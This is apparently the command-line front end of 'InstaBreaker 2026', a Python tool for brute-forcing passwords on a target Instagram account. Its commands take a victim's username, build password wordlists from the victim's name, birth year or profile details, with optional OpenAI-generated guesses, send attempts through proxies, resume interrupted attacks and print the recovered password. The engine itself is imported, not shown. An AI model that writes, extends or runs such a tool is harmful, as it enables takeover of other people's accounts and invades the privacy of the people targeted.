import asyncio
import typer
from typing import Optional, List
from pathlib import Path
from rich.progress import Progress

from .utils.display import display
from .utils.config import settings
from .core.engine import BreakerEngine
from .core.wordlist import WordlistGenerator
from .core.session import SessionManager

app = typer.Typer(help="InstaBreaker 2026: A modern Instagram tool.")

@app.command()
def attack(
    username: str = typer.Argument(..., help="Target Instagram username"),
    wordlist: Optional[Path] = typer.Option(None, "--wordlist", "-w", help="Path to wordlist file"),
    proxy: Optional[str] = typer.Option(None, "--proxy", "-p", help="Proxy URL (e.g. http://127.0.0.1:8080)"),
    ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
    resume: bool = typer.Option(True, "--resume/--no-resume", help="Resume from last checkpoint if available"),
):
    """Start a brute-force attack against a target account."""
    display.banner()
    
    passwords = []
    if wordlist:
        if wordlist.exists():
            passwords = wordlist.read_text().splitlines()
        else:
            display.error(f"Wordlist file not found: {wordlist}")
            raise typer.Exit(1)
    elif ai:
        if not settings.openai_api_key:
            display.error("OpenAI API key not set. Use 'instabreaker config --openai-key KEY' first.")
            raise typer.Exit(1)
        profile_info = typer.prompt("Enter any known profile info (name, bio, interests, etc.)")
        generator = WordlistGenerator()
        display.log("Generating AI wordlist...")
        try:
            passwords = asyncio.run(generator.generate_with_ai(profile_info))
        except Exception as e:
            display.error(f"AI generation failed: {e}")
            raise typer.Exit(1)
    else:
        name = typer.prompt("Enter target's name")
        year = typer.prompt("Enter target's birth year", default="")
        generator = WordlistGenerator()
        passwords = generator.generate_from_template(name, year)

    if not passwords:
        display.error("No passwords to test.")
        raise typer.Exit(1)

    session_mgr = SessionManager(username)
    start_index = 0
    if resume:
        start_index = session_mgr.load_checkpoint(username)
        if start_index > 0:
            display.log(f"Resuming from index {start_index}...")

    display.log(f"Starting attack on {username} with {len(passwords)} passwords...")
    
    engine = BreakerEngine(username, passwords, proxy=proxy)
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Attacking...", total=len(passwords))
        progress.update(task, completed=start_index)
        
        def update_progress(n):
            progress.update(task, advance=n)
            
        found = asyncio.run(engine.run(progress_callback=update_progress, resume=resume))

    if found:
        display.success(f"Attack successful! Password: {found}")
    else:
        display.error("Attack failed. No password found or rate limited.")

@app.command()
def generate_wordlist(
    output: Path = typer.Option(..., "--output", "-o", help="Output file path"),
    ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
):
    """Generate a wordlist for later use."""
    display.banner()
    passwords = []
    
    if ai:
        if not settings.openai_api_key:
            display.error("OpenAI API key not set.")
            raise typer.Exit(1)
        profile_info = typer.prompt("Enter any known profile info")
        generator = WordlistGenerator()
        display.log("Generating AI wordlist...")
        try:
            passwords = asyncio.run(generator.generate_with_ai(profile_info))
        except Exception as e:
            display.error(f"AI generation failed: {e}")
            raise typer.Exit(1)
    else:
        name = typer.prompt("Enter target's name")
        year = typer.prompt("Enter target's birth year", default="")
        generator = WordlistGenerator()
        passwords = generator.generate_from_template(name, year)
    
    output.write_text("\n".join(passwords))
    display.success(f"Wordlist saved to {output}")

@app.command()
def sessions(
    action: str = typer.Argument("list", help="Action to perform: list, delete"),
    username: Optional[str] = typer.Argument(None, help="Username for delete action")
):
    """Manage saved sessions."""
    display.banner()
    if action == "list":
        sessions_list = SessionManager.list_sessions()
        if not sessions_list:
            display.log("No saved sessions found.")
            return
        display.show_table("Saved Sessions", ["Username"], [[s] for s in sessions_list])
    elif action == "delete":
        if not username:
            display.error("Username is required for delete action.")
            return
        mgr = SessionManager(username)
        mgr.delete_session()
        display.success(f"Session for {username} deleted.")
    else:
        display.error(f"Unknown action: {action}")

@app.command()
def config(
    openai_key: Optional[str] = typer.Option(None, "--openai-key", help="Set OpenAI API Key")
):
    """Manage configuration."""
    if openai_key:
        # Simple way to save to .env
        env_path = Path(".env")
        lines = []
        if env_path.exists():
            lines = env_path.read_text().splitlines()
        
        new_lines = [l for l in lines if not l.startswith("OPENAI_API_KEY=")]
        new_lines.append(f"OPENAI_API_KEY={openai_key}")
        env_path.write_text("\n".join(new_lines))
        display.success("OpenAI API Key saved to .env")
    else:
        display.log(f"Config directory: {settings.app_dir}")
        display.log(f"Sessions directory: {settings.sessions_dir}")
        display.log(f"OpenAI API Key: {'Set' if settings.openai_api_key else 'Not set'}")

if __name__ == "__main__":
    app()
